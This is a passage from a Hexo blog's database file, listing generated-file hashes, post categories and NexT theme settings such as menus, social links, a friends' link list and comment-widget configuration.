fied":1607336965614},{"_id":"public/post/bd50b816/index.html","hash":"eeff549c2ec0fffb9022e364cfa4f1154558f85e","modified":1607336965614},{"_id":"public/post/36af3259/index.html","hash":"8e55ce1f68e63d34abc276d2e0cfb2b0f418145b","modified":1607336965614},{"_id":"public/post/34b16289/index.html","hash":"d6b91adc792895a4f3b9181c178cab4c5169716b","modified":1607336965614},{"_id":"public/post/cc74b154/index.html","hash":"54a76406d43a6a3e3fa5337c3666b9b1789a219d","modified":1607336965614},{"_id":"public/post/2626d8b6/index.html","hash":"e74388cf30e762ba103435fbbe03fddf7d3ce494","modified":1607336965614},{"_id":"public/post/277d2a74/index.html","hash":"eb373dc0097d5df15dd32e4a67b12be9a4260284","modified":1607336965614},{"_id":"public/post/2e9e806c/index.html","hash":"ba80907fb0b74944f7a9edd6f50543eae4e96f89","modified":1607336965614},{"_id":"public/post/37646cf8/index.html","hash":"77bbd4617aae92f0431d9a5bbcc9f9e357d4ec32","modified":1607336965614},{"_id":"public/post/7c4a6922/index.html","hash":"2f5cd4b28c0e4f1111d02933d989a4455393de95","modified":1607336965614},{"_id":"public/post/bd210d73/index.html","hash":"173486fa4ce320c6c47ced0e1aeed16045db35ff","modified":1607336965614},{"_id":"public/post/f29422fd/index.html","hash":"70ca5999a3da899612dfa925697a20c8d4313ade","modified":1607336965614},{"_id":"public/post/7c021667/index.html","hash":"5b4149a218c4290723a0b4e11b87c83dc05eef9f","modified":1607336965614},{"_id":"public/post/a4ce31d2/index.html","hash":"98ac1c01631eee256cc5d63a45fe79898217eb0d","modified":1607336965614},{"_id":"public/post/ab3ec9eb/index.html","hash":"acb58423aecf3a9bd8689b4c54743f63a6345a41","modified":1607336965614},{"_id":"public/post/ffbd0586/index.html","hash":"f8b44efa63a22f7fa43fae32701e206a9b37f942","modified":1607336965614},{"_id":"public/post/5c80f146/index.html","hash":"18b38c489dddbcb8203d927fc656040b9f76193c","modified":1607336965614},{"_id":"public/post/a56468f6/index.html","hash":"4a20402689b0ab678f300f3081f5322492f8e361","modified":1607336965614},{"_id":"public/post/ea4681d0/index.html","hash":"ee4e2469abc2dd09cbde0009ad11ff97afacd675","modified":1607336965614},{"_id":"public/post/da99de06/index.html","hash":"f9cfe23f378ac3d1cc2839424f1506401d3a8ff8","modified":1607336965614},{"_id":"public/post/278aaa5d/index.html","hash":"230187a55c3be31dbdf48ed059d87d29b1944448","modified":1607336965614},{"_id":"public/post/2071db18/index.html","hash":"8bc9c4bcb40290a3475e8be1e1ac80f3aad2789b","modified":1607336965614},{"_id":"public/post/49558830/index.html","hash":"131678b3616e4620d477b54abd1d14fe00c7bf98","modified":1607336965614},{"_id":"public/post/e17037ac/index.html","hash":"48a000d0376f515ce6f8a7ed89dc966b390407bc","modified":1607336965614},{"_id":"public/post/ba3acb8e/index.html","hash":"41019627b42f775db6f3a022a131cc21bb46c080","modified":1607336965614},{"_id":"public/post/902d70b2/index.html","hash":"0d8091f653d8b29dd7f69ead89388b79cb1d7d59","modified":1607336965614},{"_id":"public/post/11bb3efa/index.html","hash":"1fd53c24346e11410f56fdc4d3a375e8c8bb1c08","modified":1607336965614},{"_id":"public/post/52089862/index.html","hash":"7a4bc61741040a8944b387e35d4f1a95a3f1eeec","modified":1607336965614},{"_id":"public/post/2640927a/index.html","hash":"71d6a9184330929bab50a91f27f5ce96ab0f9f7e","modified":1607336965614},{"_id":"public/post/2cf738e6/index.html","hash":"b2af4d93b230dcbf39e8cce160dfacdbcd60d44c","modified":1607336965614},{"_id":"public/post/8da1c66a/index.html","hash":"1b8e509609fdd5a869fe69d4340654b7584e02cf","modified":1607336965614},{"_id":"public/post/4759e4d8/index.html","hash":"91ff52c2b704d04dac0a65286b8143525a034601","modified":1607336965614},{"_id":"public/post/20c47d09/index.html","hash":"14197bdd74a3307e6a7292e1c6a998a75cb651fa","modified":1607336965614},{"_id":"public/post/f216fabe/index.html","hash":"68dd8ce2c5cdd87cf9829d149a128e6f8fc7897c","modified":1607336965614},{"_id":"public/post/7d16c0e9/index.html","hash":"70ef5ae334be6067539314be7104ec44a878b9a3","modified":1607336965614},{"_id":"public/post/d97143a2/index.html","hash":"634985dcd1dea3e8cffbf1d7fd749831a0fda3e7","modified":1607336965614},{"_id":"public/post/64311e43/index.html","hash":"687bf3100750db05a02fb1325d9b0e6b9c69051c","modified":1607336965614},{"_id":"public/post/2362a8ea/index.html","hash":"0eb5703023fdd2edbfe4828a9f278b4d199a9b7c","modified":1607336965614},{"_id":"public/post/25d78577/index.html","hash":"575f97b8ff5c3780328dc0affab22c49e65c14dc","modified":1607336965614},{"_id":"public/post/924b455d/index.html","hash":"dcad2681bdd243874ec9718dc06ceef8d745f7c5","modified":1607336965614},{"_id":"public/post/d1bf19f/index.html","hash":"cfdfdf96d6194d1ed3ad536aacb8c5676c24d860","modified":1607336965614},{"_id":"public/archives/2019/index.html","hash":"b008ebb245989650ac3b1db70bf54688f18b8dbe","modified":1607336965614},{"_id":"public/archives/2019/03/index.html","hash":"b183be265ff44c094ef65d8c53f764ad34e9e748","modified":1607336965614},{"_id":"public/archives/2019/04/index.html","hash":"073a96be76bf4de1bb7e437221525054bff11e15","modified":1607336965614},{"_id":"public/archives/2019/05/index.html","hash":"fc85faf1515558ac24fa97d74bb4bad0cfce0193","modified":1607336965614},{"_id":"public/archives/2019/06/index.html","hash":"c815f48f7165174eda3f6347042b1bbb83234cac","modified":1607336965614},{"_id":"public/archives/2019/07/index.html","hash":"af694303e2e197542acea81b140b44072858fc6d","modified":1607336965614},{"_id":"public/archives/2020/index.html","hash":"ffed1dcc453f8b2709558d4daefb271937bef31a","modified":1607336965614},{"_id":"public/archives/2020/04/index.html","hash":"c6fb13a0260d53c067847c7ad98b723a21c55fc6","modified":1607336965614},{"_id":"public/archives/2020/05/index.html","hash":"096d3b5b6e0d7661be4b5c158bc5689fa13ffae9","modified":1607336965614},{"_id":"public/archives/2020/10/index.html","hash":"a2549b1a84b5ca5b54dceeaa995abdfa1d46f16d","modified":1607336965614},{"_id":"public/archives/2020/12/index.html","hash":"b0c4f4b71224cd42b31fb7f0c64a6b46518bbdd0","modified":1607336965614},{"_id":"public/categories/计算机网络/index.html","hash":"03c4cca3ae271016e01ccc5483fd5601b035972b","modified":1607336965614},{"_id":"public/categories/Algorithm/index.html","hash":"34de82030598b41a929dbf4ce1ca35230a5209a6","modified":1607336965614},{"_id":"public/categories/操作系统/index.html","hash":"56b059554d1e59a4beaf54fe721e5e1cd87344b5","modified":1607336965614},{"_id":"public/categories/数据结构/index.html","hash":"0b58620ab4d6c5910db82ba9a9591ec268ec4be6","modified":1607336965614},{"_id":"public/categories/编程语言/index.html","hash":"23d9c3e6a5afdf304b62dddd6c302d7f8c42e5d1","modified":1607336965614},{"_id":"public/categories/资料/index.html","hash":"254d905a005bf4d3d10f118cce29921fad3ab965","modified":1607336965614},{"_id":"public/categories/Web/index.html","hash":"c6dd52e09faf7421934750bb543203a9edc72a05","modified":1607336965614},{"_id":"public/categories/操作系统/Shell/index.html","hash":"fcd7f2c1d46cb70709b6e85a3423d02e129c2426","modified":1607336965614},{"_id":"public/categories/软件/index.html","hash":"620392990d0a63b68a613174a6106399de7a78fc","modified":1607336965614},{"_id":"public/categories/计算机图形学/index.html","hash":"f97b0acbd45881787ec9964ef7480f40d0940207","modified":1607336965614},{"_id":"public/categories/编程语言/C/index.html","hash":"9539ea8e704c768fb5527480759dd3e88fb49ba9","modified":1607336965614},{"_id":"public/categories/编程语言/Python/index.html","hash":"f4dbd0dfe8078ebc30cc0663d39a3d11313c07e1","modified":1607336965614},{"_id":"public/categories/Web/OJ/index.html","hash":"d2ac94ce73ce8a7daaf14329af171bba8c1b379d","modified":1607336965614},{"_id":"public/categories/Web/博客/index.html","hash":"21dbfc56c9a68406eef4cad023c5b973b5416856","modified":1607336965614},{"_id":"public/categories/软件/Excel/index.html","hash":"48287d3e7cae5dc6d2c3f988a007d4f0250df857","modified":1607336965614},{"_id":"public/categories/计算机图形学/OpenGL/index.html","hash":"f4f5a9c29457477e482425a24290d3527cb32c14","modified":1607336965614},{"_id":"public/categories/机器学习/index.html","hash":"8416dee65f70b01a4240b0579073aa38bc06777f","modified":1607336965614},{"_id":"public/categories/Web/Console/index.html","hash":"316b6ab82a4bf6dc67b135e996812e6384b90aeb","modified":1607336965614},{"_id":"public/categories/机器学习/梯度下降/index.html","hash":"ef8cf0e1f6dcac9a7622aa147f9a4443be24884e","modified":1607336965614},{"_id":"public/index.html","hash":"f95b213b293ca491e730cf28a0049720a9cb3297","modified":1607336965614},{"_id":"public/page/2/index.html","hash":"e14d7087d88649f66a1aac35865e76fcd3c1eeaa","modified":1607336965614},{"_id":"public/page/3/index.html","hash":"e79d104c076818c5c49ca6f39bb03de9c92e90a5","modified":1607336965614},{"_id":"public/page/4/index.html","hash":"2635f8457263f840902597f2313ab472390f2578","modified":1607336965614},{"_id":"public/page/5/index.html","hash":"d8b5c95d2a0fab23e1388942a3e722304b493ef0","modified":1607336965614},{"_id":"public/page/6/index.html","hash":"5c0120f34af101ca49d7b54d2f7be9fc9a6d3a86","modified":1607336965614},{"_id":"public/page/7/index.html","hash":"25fbff7bb4aaba0d0177d8de06619b10419a053b","modified":1607336965614},{"_id":"public/page/8/index.html","hash":"bb4716bf6ed16b4b8e22f0a41eb015cd3df6bcd7","modified":1607336965614},{"_id":"public/page/9/index.html","hash":"266fd4fd95aac1fd954062d2206b277a8388d88d","modified":1607336965614},{"_id":"public/page/10/index.html","hash":"1a4d074baac2e91c7b02023c62dbc42cf46ef9ae","modified":1607336965614},{"_id":"public/page/11/index.html","hash":"7dec67ea3113f1eab2f3635fa2b295f5b838a677","modified":1607336965614},{"_id":"public/tags/Python/index.html","hash":"67f428fcf4544e2647641fd1b8a9907e5f8967ae","modified":1607336965614},{"_id":"public/tags/ARP/index.html","hash":"c281e0176c6b252bed7a3f5d2b955fe5ab84f878","modified":1607336965614},{"_id":"public/tags/KMP/index.html","hash":"f535223775e20a56d29436a90979cdefd09ca967","modified":1607336965614},{"_id":"public/tags/批处理/index.html","hash":"1cdc669bbf8e6072ef2e40b8778e860c9388b8f8","modified":1607336965614},{"_id":"public/tags/树/index.html","hash":"88411980f221a7da70ec419d3a57442ff1baebd4","modified":1607336965614},{"_id":"public/tags/二叉树/index.html","hash":"048302ac6147aab8d538d927a1eae832353a26ab","modified":1607336965614},{"_id":"public/tags/GUI/index.html","hash":"b10cbcd8dfd4342d3f0e005931682018dd695c53","modified":1607336965614},{"_id":"public/tags/Notepad/index.html","hash":"1f97b1c5b5d93b1d664885324a5d6f86a2c0d896","modified":1607336965614},{"_id":"public/tags/VIM/index.html","hash":"aeffcea14b918ff6001462248eff859800841307","modified":1607336965614},{"_id":"public/tags/VScode/index.html","hash":"be57ea10ba2b232acdc7e8b5dd095d5b96a1c5c5","modified":1607336965614},{"_id":"public/tags/Sublime/index.html","hash":"ce4b08ff980f1612baca345a2fa818963f6a4fff","modified":1607336965614},{"_id":"public/tags/Domjudge/index.html","hash":"651dbff30eac2afc46eccb17f17fc7b8ffa357c1","modified":1607336965614},{"_id":"public/tags/EOJ/index.html","hash":"b142ead2afcc4de2d88c0f08feb005d74a68b990","modified":1607336965614},{"_id":"public/tags/Hexo/index.html","hash":"1561bdb9e562a311661602bedd0622a85eda93a3","modified":1607336965614},{"_id":"public/tags/ExGCD/index.html","hash":"3fe0abb4c181f6a06ec2d5d27b62047c3ca91719","modified":1607336965614},{"_id":"public/tags/GCD/index.html","hash":"6771cf624b0dfb54de24748c814077782aee8426","modified":1607336965614},{"_id":"public/tags/OpenGL/index.html","hash":"1288b16cb24f7214d505071783ec995e59e1e804","modified":1607336965614},{"_id":"public/tags/GLSL/index.html","hash":"1fb623380980a1f7dd7097f30323a603d6a5d36b","modified":1607336965614},{"_id":"public/tags/题解/index.html","hash":"20e7e18c694fa470bbb5afd25db58cdbb837da26","modified":1607336965614},{"_id":"public/tags/NexT/index.html","hash":"71f69f4416b6f21ef51cc320808a603815893e80","modified":1607336965614},{"_id":"public/tags/哈夫曼编码/index.html","hash":"7a0b2c4eec2a7a04de6832685e0be5322f733f82","modified":1607336965614},{"_id":"public/tags/同余定理/index.html","hash":"2fe20f6f3cafa3393af0986262ee04a4edafbfed","modified":1607336965614},{"_id":"public/tags/Minecraft/index.html","hash":"709dd5908ce3559962ace292a1a78bc814e03b6c","modified":1607336965614},{"_id":"public/tags/虚拟局域网/index.html","hash":"be6dd9f428a0550c4f6477fc10fdb6faca3501aa","modified":1607336965614},{"_id":"public/tags/N2N/index.html","hash":"67c7158010e31ebaf00766f424f2965e9975cfca","modified":1607336965614},{"_id":"public/tags/nginx/index.html","hash":"856b107e8f2cb0deb8e98125b52fd695eef67ad8","modified":1607336965614},{"_id":"public/tags/frp/index.html","hash":"5c39c4f7301e7398b98a67b99a840d3b2ef4f65f","modified":1607336965614},{"_id":"public/tags/PIL/index.html","hash":"565a71ca1bc860e54c74c222f51877748bccdc9b","modified":1607336965614},{"_id":"public/tags/爬虫/index.html","hash":"04f0bf5b497c234aa70371fe3b2b2a3491573b68","modified":1607336965614},{"_id":"public/tags/多线程/index.html","hash":"c0265ff25295356ccc3562edc08ed870abf155ab","modified":1607336965614},{"_id":"public/tags/算法/index.html","hash":"164ea46c80e6c1e60c1c28829004e1f18eb72684","modified":1607336965614},{"_id":"public/tags/turtle/index.html","hash":"a575fa7d31eea00b7a249879ffa3b8dab70735ec","modified":1607336965614},{"_id":"public/tags/cmd/index.html","hash":"6fc32b5e20bbf44e51740430c5392c569026d61d","modified":1607336965614},{"_id":"public/tags/powershell/index.html","hash":"425552f13dd966f8694182e81cfc6d1b6e9f9b3c","modified":1607336965614},{"_id":"public/tags/C/index.html","hash":"60ad481799c445e607a78241f249dafe7211a54a","modified":1607336965614},{"_id":"public/tags/排序/index.html","hash":"259a893cc9ed68c0a2cd1e577370daef979a7878","modified":1607336965614},{"_id":"public/tags/Wget/index.html","hash":"cbe009bc1a2a9e70e316168c40ef19b1d6a34925","modified":1607336965614},{"_id":"public/tags/中国剩余定理/index.html","hash":"776466bb761b9559d30fa4a9ec9182a87b99fddb","modified":1607336965614},{"_id":"public/tags/端口映射/index.html","hash":"156d9d2b968f9fc1cda7ed0bc98f6214a60af1be","modified":1607336965614},{"_id":"public/tags/邻接矩阵/index.html","hash":"0e74a3d93c79fa7178f6ff7224c0662e47f05869","modified":1607336965614},{"_id":"public/tags/DFS/index.html","hash":"be1ff44b154d22ef2bbaad69386edb997503fc49","modified":1607336965614},{"_id":"public/tags/BFS/index.html","hash":"d679d4e2995fde1ce5e90cb5aef3b3889c305270","modified":1607336965614},{"_id":"public/tags/快速幂/index.html","hash":"1fcde61672cf4509fa888e707f630bb721633d97","modified":1607336965614},{"_id":"public/tags/Linux/index.html","hash":"d53d22283dae8760321b4257f152fd18f8f9a027","modified":1607336965614},{"_id":"public/tags/WordPress/index.html","hash":"684ad4122b2b06573bd7531f3185658bb1412d76","modified":1607336965614},{"_id":"public/tags/最短路/index.html","hash":"aa54e8b8a93e41a0aa26a5c7a37fe79adb1ea450","modified":1607336965614},{"_id":"public/tags/Dijkstra/index.html","hash":"98c88abc0563b780517ee4eee7eabfeae648f26e","modified":1607336965614},{"_id":"public/tags/ML/index.html","hash":"db2047447c0f5b797c1517a4d2d5d3f78a006792","modified":1607336965614},{"_id":"public/tags/矩阵/index.html","hash":"ddbed0fb1ed98337a451d62fb08557d2d99ecd33","modified":1607336965614},{"_id":"public/tags/脚本/index.html","hash":"554e7231b434c54c2663feb2679c82207ad134d3","modified":1607336965614},{"_id":"public/tags/WinForm/index.html","hash":"2830486bcdbed1756c589d2c64e841939cf570d7","modified":1607336965614},{"_id":"public/tags/贪心/index.html","hash":"b01ad70ecc862da76023116df388fb7b7ba62a1e","modified":1607336965614},{"_id":"public/tags/逆元/index.html","hash":"52a8f44f7487b41916e070fc2a18b646f488e194","modified":1607336965614},{"_id":"public/tags/链表/index.html","hash":"f3cf41c848d6b1f38bc196f9a51acb5c33584907","modified":1607336965614},{"_id":"public/tags/栈/index.html","hash":"03faf6c1e9d3b24e32f7bdabd9d12986baf927f5","modified":1607336965614},{"_id":"public/tags/顺序表/index.html","hash":"fc138ea0612495da347a9f62a1c4d032c401e144","modified":1607336965614},{"_id":"public/tags/队列/index.html","hash":"e7df54956770117fb645da636b749b6eb722eef6","modified":1607336965614},{"_id":"public/README.md","hash":"f5d71eaf068ac8f967fd43640272db7c6fb18ab5","modified":1607336965614},{"_id":"public/CNAME","hash":"b5344e15ed249b8a53c6ba029ca23353fd518415","modified":1607336965614},{"_id":"public/diy/1.html","hash":"9679a628000fbc144dbf721b9b6f1f2e1aad322c","modified":1607336965614},{"_id":"public/diy/discDrop.swf","hash":"abda25adb2c4c083c093dadb13d7b5670b5ac0e7","modified":1607336965614},{"_id":"public/diy/fish.swf","hash":"9735b84a9a29f8be0da834e5e4741703c7961def","modified":1607336965614},{"_id":"public/diy/hamster.swf","hash":"3a1d1a3808dca7fb9abe0582f4edc5a7d1f69cc2","modified":1607336965614},{"_id":"public/diy/newtonsCradle.swf","hash":"6ca813a29d0ddabf6dd11f612ec33b5f50cbd186","modified":1607336965614},{"_id":"public/diy/pendulumClockV2.swf","hash":"bf5a082d2152556b1dd52486912243bfc8a660db","modified":1607336965614},{"_id":"public/diy/penguins.swf","hash":"9ac1be1035cdc493b5e85395f417699d51377998","modified":1607336965614},{"_id":"public/diy/spider.swf","hash":"31a3e1ddcd2e5b21a2e80a03dc17f4519c387777","modified":1607336965614},{"_id":"public/diy/stingray.swf","hash":"2df704302ade91a21fd86d71593555d4990f321b","modified":1607336965614},{"_id":"public/diy/treefrog.swf","hash":"386f4e5716bbd5631d8c58a260249c0070a635ad","modified":1607336965614},{"_id":"public/diy/turtle.swf","hash":"da50c40dc0c8768e9c3ae507dec1fd0e1139406a","modified":1607336965614},{"_id":"public/images/algolia_logo.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1607336965614},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1607336965614},{"_id":"public/images/avatar.gif","hash":"18c53e15eb0c84b139995f9334ed8522b40aeaf6","modified":1607336965614},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1607336965614},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1607336965614},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1607336965614},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1607336965614},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1607336965614},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1607336965614},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1607336965614},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1607336965614},{"_id":"public/images/logo.svg","hash":"d29cacbae1bdc4bbccb542107ee0524fe55ad6de","modified":1607336965614},{"_id":"public/images/quote-l.svg","hash":"94e870b4c8c48da61d09522196d4dd40e277a98f","modified":1607336965614},{"_id":"public/images/quote-r.svg","hash":"e60ae504f9d99b712c793c3740c6b100d057d4ec","modified":1607336965614},{"_id":"public/lib/font-awesome/HELP-US-OUT.txt","hash":"4f7bf961f1bed448f6ba99aeb9219fabf930ba96","modified":1607336965614},{"_id":"public/lib/font-awesome/css/font-awesome.css.map","hash":"0189d278706509412bac4745f96c83984e1d59f4","modified":1607336965614},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1607336965614},{"_id":"public/css/blog-encrypt.css","hash":"22e25b0d16ea053d25eb971e038c817a4c9cb584","modified":1607336965614},{"_id":"public/lib/blog-encrypt.js","hash":"91fda12d550323056762c5408623eb8a1d201ecc","modified":1607336965614},{"_id":"public/diy/ballclock.swf","hash":"f7179056d912815a7398bbe1a772480917015da0","modified":1607336965614},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1607336965614},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1607336965614},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1607336965614},{"_id":"public/js/local-search.js","hash":"b42bd1c883ce91db8632d96e0f0e062cb6b73adc","modified":1607336965614},{"_id":"public/js/motion.js","hash":"72df86f6dfa29cce22abeff9d814c9dddfcf13a9","modified":1607336965614},{"_id":"public/js/next-boot.js","hash":"a22eeb6048ddd6b9224c8a671cbcfa303a2f7a1a","modified":1607336965614},{"_id":"public/js/utils.js","hash":"d67ec81b659af1307bcf8b8de0fed02dc184c523","modified":1607336965614},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1607336965614},{"_id":"public/lib/font-awesome/bower.json","hash":"64394a2a9aa00f8e321d8daa5e51a420f0e96dad","modified":1607336965614},{"_id":"public/js/schemes/pisces.js","hash":"3d9d3c14b77044d66be1898a9a934696e9127c82","modified":1607336965614},{"_id":"public/css/main.css","hash":"55c435eeab70c4a8902e8f83119a98645b594f92","modified":1607336965614},{"_id":"public/lib/anime.min.js","hash":"47cb482a8a488620a793d50ba8f6752324b46af3","modified":1607336965614},{"_id":"public/lib/font-awesome/css/font-awesome.min.css","hash":"512c7d79033e3028a9be61b540cf1a6870c896f8","modified":1607336965614},{"_id":"public/diy/dog.swf","hash":"69a78b1f7e2777ec598b037bfa47b22964874b0a","modified":1607336965614},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1607336965614},{"_id":"public/lib/font-awesome/css/font-awesome.css","hash":"0140952c64e3f2b74ef64e050f2fe86eab6624c8","modified":1607336965614}],"Category":[{"name":"计算机网络","_id":"ckieexka60004qse57snp4r9a"},{"name":"Algorithm","_id":"ckieexkac000cqse566nb1m22"},{"name":"操作系统","_id":"ckieexkaj000jqse51sfh0v67"},{"name":"数据结构","_id":"ckieexkao000qqse5ejr2gp9l"},{"name":"编程语言","_id":"ckieexkar000vqse5brmy459f"},{"name":"资料","_id":"ckieexkau0013qse51fp44i3t"},{"name":"Web","_id":"ckieexkb2001fqse5g7wa5kqz"},{"name":"Shell","parent":"ckieexkaj000jqse51sfh0v67","_id":"ckieexkb5001mqse56py7daom"},{"name":"软件","_id":"ckieexkbh001zqse59w88h7ho"},{"name":"计算机图形学","_id":"ckieexkbm0027qse5c8ts6hvj"},{"name":"C++","parent":"ckieexkar000vqse5brmy459f","_id":"ckieexkbs002cqse5hxsygbul"},{"name":"Python","parent":"ckieexkar000vqse5brmy459f","_id":"ckieexkc2002yqse5coe8e6wd"},{"name":"OJ","parent":"ckieexkb2001fqse5g7wa5kqz","_id":"ckieexkcy003eqse5cn3k7ces"},{"name":"博客","parent":"ckieexkb2001fqse5g7wa5kqz","_id":"ckieexkdz003sqse53fhodai7"},{"name":"Excel","parent":"ckieexkbh001zqse59w88h7ho","_id":"ckieexkes004lqse538jm9y5k"},{"name":"OpenGL","parent":"ckieexkbm0027qse5c8ts6hvj","_id":"ckieexkex004wqse5ezh7fqdp"},{"name":"机器学习","_id":"ckieexkfe005pqse5793qfn1k"},{"name":"Console","parent":"ckieexkb2001fqse5g7wa5kqz","_id":"ckieexkfh005wqse5101scf1k"},{"name":"C#","parent":"ckieexkar000vqse5brmy459f","_id":"ckieexkfi0060qse5bxilg3is"},{"name":"梯度下降","parent":"ckieexkfe005pqse5793qfn1k","_id":"ckieexkfk0065qse518gg4xu2"}],"Data":[{"_id":"sidebar","data":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n"},{"_id":"next","data":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored"